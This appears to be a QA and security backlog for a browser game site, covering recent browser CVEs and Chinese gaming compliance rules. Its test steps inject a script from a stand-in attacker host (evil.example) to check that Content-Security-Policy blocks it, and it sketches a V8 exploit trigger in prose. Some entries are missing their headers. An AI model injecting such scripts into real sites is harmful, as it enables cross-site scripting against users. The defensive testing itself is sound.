### Security (S)

- [S-433] **[P0]** CVE-2026-28962 Safari 26.5 WebKit Content-Security-Policy Bypass — WebKit Flaw Allowed Attackers to Bypass CSP Headers Entirely, Leaking User Sensitive Information; Fixed in Safari 26.5 (May 14 2026) via Improved Access Restrictions + Input Validation + Processing Logic; First Confirmed 2026 WebKit CSP-Bypass CVE (finance.sina.com.cn/tech/digi/2026-05-14/doc-inhxvtwn8763233.shtml May 14 2026 — "在官方披露的安全修复中,最值得关注的一个修复聚焦 WebKit,追踪编号为 CVE-2026-28962,涉及绕过内容安全策略,泄露用户敏感信息｡苹果公司通过改进访问限制､输入校验和处理逻辑,已在 26.5 新版中修复" + sohu.com/a/1022622771_122004016 May 14 2026 — "编号为CVE-2026-28962的漏洞,这一问题可能导致内容安全策略被绕过,从而泄露用户的敏感信息"). **Why this is the WEBKIT-CSP-BYPASS-CVE-2026-28962 dimension distinct from S-429 (Chrome Blink CSS exfiltration, v1.191.0) and S-431 (ClickFix social-engineering)**: S-429 covered a Chrome-side CSS-based exfiltration that chains `@import` + attribute selectors — it leaks data WITHOUT bypassing CSP, it smuggles data out through allowed CSS channels. S-431 covered social-engineering where no browser vuln is exploited. S-433 captures the **WEBKIT-CSP-ENGINE-BYPASS** dimension where the browser's CSP enforcement itself is broken — the CSP header is present and correct, but WebKit fails to enforce it, allowing disallowed scripts/resources to load and execute. This is categorically more severe than a CSS exfiltration because it defeats the ENTIRE CSP defense, not just one channel. **Why this matters for GameZipper**: (a) GameZipper relies on CSP headers (or `<meta http-equiv="Content-Security-Policy">`) to prevent malicious ad-iframe scripts from executing arbitrary JS on the gamezipper.com origin — if a Safari user is on <26.5, that defense is silently absent; (b) the ad iframes loaded by `monetag-manager.js` / Adsterra / AdSense serve third-party creative that CSP is supposed to contain — with CSP bypassed, a single malicious rich-media ad can escalate to full XSS on the gamezipper.com origin (stealing localStorage game saves, injecting fake login prompts, mining cryptocurrency); (c) Safari desktop+mobile share is ~20-25% of GameZipper traffic, and Safari auto-update adoption is slower than Chrome's (many users lag 1-2 minor versions) — a meaningful fraction of Safari users will be on vulnerable versions for weeks after the 26.5 fix; (d) QA must add a **CSP-enforcement verification probe** that confirms CSP actually blocks a known-bad script injection (not just that the header is present) — `fetch('https://evil.example/x.js')` inside a page with `script-src 'self'` should be blocked; if it succeeds on Safari, the user is on a vulnerable version; (e) the fix pattern (improved access restrictions + input validation + processing logic) suggests the bypass was in WebKit's CSP directive parser or source-list matcher — QA should test edge-case CSP directives (`script-src 'self' 'unsafe-inline'`, `script-src 'nonce-XXX'`, `script-src 'sha256-XXX'`) to confirm they enforce correctly post-26.5. **Detection**: static — check if GameZipper pages emit a CSP header (`curl -sI https://gamezipper.com/ | grep -i content-security-policy`) or a `<meta http-equiv="Content-Security-Policy">` tag; if neither, GameZipper has NO CSP defense at all (separate P1 gap). **Dynamic**: inject a `<script src="https://evil.example/x.js"></script>` via devtools console on Safari <26.5 vs ≥26.5 and confirm the ≤26.5 browser executes it while ≥26.5 blocks it.

- [S-434] **[P1]** CVE-2025-13223 Chrome Zero-Day (Nov 19 2025, Actively Exploited) — Google Emergency Patch for Chrome 0-Day Under Active Exploitation; Details Sparse (No CVSS/Public Technical Writeup in Chinese Sources) but Confirmed In-The-Wild; Regression Baseline for Unpatched Chrome Users (so.html5.qq.com/page/real/search_news?docid=70000021_414691d2fcf97652 Nov 19 2025 — "谷歌紧急修复Chrome浏览器正被利用的0Day漏洞(CVE-2025-13223)"). **Why this is the CHROME-0DAY-CVE-2025-13223-ACTIVELY-EXPLOITED dimension distinct from S-428 (CVE-2026-5281 Chrome WebGPU/Dawn, v1.191.0) and B-221 (CVE-2025-10585 V8 type-confusion)**: S-428 covered a 2026 Chrome WebGPU 0-day with full technical detail (use-after-free in Dawn). B-221 (this cycle) covers a 2025 V8 type-confusion with a known exploit chain (`Symbol.toPrimitive`). S-434 captures the **SPARSELY-DOCUMENTED-ACTIVE-EXPLOIT** dimension — CVE-2025-13223 was patched under active exploitation but Chinese media coverage does not include the component, CVSS, or exploit chain, making it a "known-bad, unknown-why" entry that QA must track because unpatched Chrome users (those who disable auto-update, enterprise-managed Chrome, embedded Chromium webviews in third-party apps) are confirmed vulnerable. **Why this matters for GameZipper**: (a) ~5-10% of Chrome users lag behind the latest stable by 1+ versions (enterprise policies, manual-update avoidance, embedded webviews in apps like Discord/Steam/Electron apps that bundle stale Chromium) — these users visit GameZipper with a browser that has a confirmed-active 0-day; (b) while GameZipper cannot force users to update, QA should record `navigator.userAgentData.brands` (Chrome version) in every verdict so that any future security incident can be correlated with the Chrome version distribution of affected sessions; (c) the lack of public technical detail means QA cannot write a targeted regression test — instead, the mitigation is the **Chrome-version-floor policy**: GameZipper's `monetag-manager.js` and ad-iframe content should not rely on Chrome security features that were broken by CVE-2025-13223 (unknown which features, so assume the worst: treat all ad-iframe content as potentially malicious regardless of Chrome version); (d) pair this with S-431 (ClickFix) — an unpatched-Chrome user visiting a GameZipper page with a malicious ad faces BOTH the social-engineering ClickFix lure AND a potential silent exploit, a compound risk.

B-220 covers **ANGLE (WebGL backend)** — the graphics translation layer that backs WebGL on Windows. GameZipper's WebGL games (and any canvas game that WebGL-fallbacks on Windows Chrome) route through ANGLE. The AI-discovery angle (Big Sleep) is a meta-signal: AI bug-finding means the vulnerability discovery rate will increase, so GameZipper's regression-test cadence must keep pace. **Why this matters for GameZipper**: (a) GameZipper has a growing WebGL game catalog (3D physics, particle-effect-heavy games) — an ANGLE UAF can crash the GPU process, taking down the game tab; (b) the UAF is triggered by crafted WebGL calls — a malicious ad iframe with WebGL access could trigger it; (c) Windows Chrome users on <fixed version are vulnerable; macOS/Linux Chrome uses native OpenGL, not ANGLE, so they are unaffected (platform-specific regression); (d) QA's WebGL smoke test (create WebGL context, render a triangle, read pixels) should be run on Windows Chrome specifically to exercise ANGLE. **Detection**: on Windows Chrome, run a WebGL stress probe (1000 draw calls with varying textures) and check for GPU-process crash (`chrome://gpu` shows "GpuProcess crashed" count).

- [B-221] **[P3]** CVE-2025-10585 Chrome V8 Type-Confusion 0-Day (Sep 18 2025, 6th Chrome 0-Day of 2025, Actively Exploited) — Exploit Chain Starts With a JavaScript Object Containing a `Symbol.toPrimitive` Handler That Returns an Array When V8 Expects a Primitive Number; Type-Confusion in V8 Type System; Pattern of V8 Type-Confusion Bugs (3rd of 2025: CVE-2024-4947, CVE-2024-5274, CVE-2025-10585) Signals V8 Type-System Weakness (so.html5.qq.com/page/real/search_news?docid=70000021_91668d2314196952 Sep 23 2025 + new.qq.com/rain/a/20250918A02USE00 Sep 18 2025 — "技术利用链始于创建一个包含Symbol.toPrimitive处理程序的JavaScript对象,当V8期望原始数字时,该处理程序会返回数组｡...这是2025年发现的第六个已被活跃利用的Chrome零日漏洞"). **Why this is the V8-TYPE-CONFUSION-SYMBOL-TO_PRIMITIVE-PATTERN dimension distinct from B-220 (ANGLE UAF, graphics layer) and S-434 (CVE-2025-13223, sparsely documented)**: B-220 is a graphics-layer bug. S-434 is undocumented. B-221 captures the **V8-TYPE-SYSTEM-WEAKNESS-PATTERN** dimension — three V8 type-confusion 0-days in <12 months (CVE-2024-4947, CVE-2024-5274, CVE-2025-10585) all exploiting the V8 type system's assumptions about value coercion, with `Symbol.toPrimitive` / Proxy / getter chains as the common trigger. This is a systemic pattern, not a one-off. **Why this matters for GameZipper**: (a) low direct risk (GameZipper games don't intentionally craft type-confusion payloads), but (b) the PATTERN means future V8 releases may tighten type-coercion semantics in ways that BREAK legitimate game code — e.g., a game that relies on implicit `valueOf()` / `Symbol.toPrimitive` coercion for its scoring math may behave differently after a V8 hardening patch; (c) QA should flag any game that uses exotic coercion patterns (`obj[Symbol.toPrimitive] = ...`, Proxy objects in hot loops) as a V8-regression risk; (d) the AI-discovery trend (B-220) + the type-confusion pattern (B-221) together mean GameZipper's per-release Chrome regression window is shrinking — what was a "test once per Chrome major" cadence may need to become "test per Chrome minor".

C-131 covered generic trust signals. C-133 captures the **CHINA-MARKET-SPECIFIC-COMPLIANCE-WAVE** dimension where the 2026 industry analysis confirms unlicensed platforms are being actively cleared out ("无资质小平台加速出清"), making compliance posture a COMPETITIVE DIFFERENTIATOR — users are explicitly choosing licensed platforms over unlicensed ones. GameZipper, if it serves China traffic, must (a) hold and display ICP 备案号 (b) display 软件著作权 (software copyright) notices (c) have a visible 防沉迷 (anti-addiction) policy page (d) display an 适龄提示 (age-appropriate rating) on each game. **Why this matters for GameZipper**: (a) the "无资质小平台加速出清" trend means Chinese users are actively screening for platform legitimacy — a GameZipper page WITHOUT visible compliance badges will be perceived as one of the "unlicensed platforms being cleared," increasing bounce rate; (b) the 体验精品化 trend raises the UX bar — GameZipper's games must meet the polish standard of the surviving licensed platforms; (c) QA must add a **compliance-badge audit** to the per-game checklist: does each game page display (or link to) the platform's ICP 备案, 软著, 防沉迷政策, 适龄提示? (d) this is a trust+legality dual requirement — missing badges lose user trust AND risk regulatory action. **Detection**: static — `grep -c "ICP备\|ICP证\|软著\|防沉迷\|适龄提示" index.html` for the homepage and a sample of game pages; if 0, GameZipper has no China-compliance surfacing.

- [C-134] **[P1]** 八部门《未成年人用户数量巨大和对未成年人群体具有显著影响的网络平台服务提供者认定办法》(Effective Apr 1 2026) — "未成年人用户数量巨大" = 专门面向未成年人服务的平台注册用户 >1000万 OR 月活跃 >100万; 非专门面向未成年人但含未成年用户的平台: 未成年注册 >1000万 OR 未成年月活跃 >100万; 被认定平台须履行更高标准未成年人保护义务; 每3年认定一次, 用户激增可适时启动 (new.qq.com/rain/a/20260228A07EF300 Feb 28 2026). **Why this is the CHINA-8-MINISTRY-MINOR-PLATFORM-DESATION-2026 dimension distinct from C-133 (general compliance) and C-130 (jurisdictional compliance)**: C-133 is broad compliance. C-134 is a **SPECIFIC REGULATORY TRIGGER** with quantitative thresholds. If GameZipper's minor-user metrics cross the 1000万-registration or 100万-MAU line, it becomes a "被认定平台" subject to higher minor-protection obligations (enhanced age verification, stricter time limits, mandatory minor-mode, periodic audits). Even if GameZipper is currently below the threshold, the "用户激增可适时启动" clause means rapid growth can trigger mid-cycle designation. **Why this matters for GameZipper**: (a) GameZipper must instrument minor-user analytics (age-segmented registration + MAU counts) to know its regulatory position relative to the 1000万/100万 thresholds; (b) if approaching the threshold, GameZipper must pre-build the higher-standard minor-protection features (real-name verification integration, play-time enforcement, content filtering) BEFORE designation, not after; (c) the "显著影响" prong (6-factor test: download volume, user scale, sales, minor login frequency, minor usage duration, minor spend) means even a sub-threshold platform can be designated if it has "significant influence" on minors — GameZipper's casual-game catalog (puzzle, arcade, idle) is inherently minor-attractive; (d) QA must verify the minor-protection features work correctly: does the age-gate actually block <18 registration? does the play-time limiter actually cut off after the daily quota? does the spend-limiter cap minor transactions? **Detection**: functional — attempt registration with a minor birthdate, confirm blocking; attempt a >3h play session as a minor, confirm cutoff.

- [C-135] **[P2]** 2026 游戏版号 (Game License/ISBN) 政策 5 核心条件 — 申报主体必须纯内资 (无外资/港澳台资), 持有 ICP 经营许可证 (注册资本 ≥100万), 持有游戏软件著作权 (软著, 名称与版号申报完全一致), 接入国家统一防沉迷系统, 提交标准化材料 (完整客户端+剧情脚本+角色设定+数值体系+防沉迷实施方案); 缺一不可, 否则直接驳回 (sohu.com/a/1013543704_120135737 Apr 23 2026). **Why this is the CHINA-GAME-LICENSE-ISBN-2026-5-REQUIREMENTS dimension distinct from C-133 (general compliance) and C-134 (minor-platform designation)**: C-133 is industry-trend compliance. C-134 is platform-level designation. C-135 is **PER-GAME LICENSING** — each individual game that GameZipper publishes in China (with monetization) requires a 版号 (ISBN), and the 2026 policy hardens the 5 requirements. This is most relevant IF GameZipper pursues formal China monetization (in-app purchases, paid games). For a free-to-play ad-supported model, 版号 may not be strictly required, but the "接入国家统一防沉迷系统" requirement applies regardless of monetization model for any game accessible in China. **Why this matters for GameZipper**: (a) the 纯内资 requirement means if GameZipper has ANY foreign/HK/Macau/Taiwan investment, it cannot directly apply for 版号 — must use an authorized domestic subsidiary; (b) the 软著 requirement means each GameZipper game's title must exactly match a registered software copyright — QA should verify title-consistency between the game page `<title>`, the `games-data.js` `name` field, and any 软著 registration; (c) the 防沉迷系统 requirement (C-134 linkage) is the actionable item even without 版号 — GameZipper games accessible in China should integrate the national anti-addiction real-name verification API or self-impose equivalent limits; (d) the "数值体系" submission requirement means GameZipper's game economy parameters (coin rewards, difficulty curves, unlock costs) become part of the regulatory record — changes post-launch may require re-submission. **Detection**: legal/ops audit (not a code test) — confirm GameZipper's corporate structure (纯内资?), ICP license status, 软著 coverage, 防沉迷 integration.
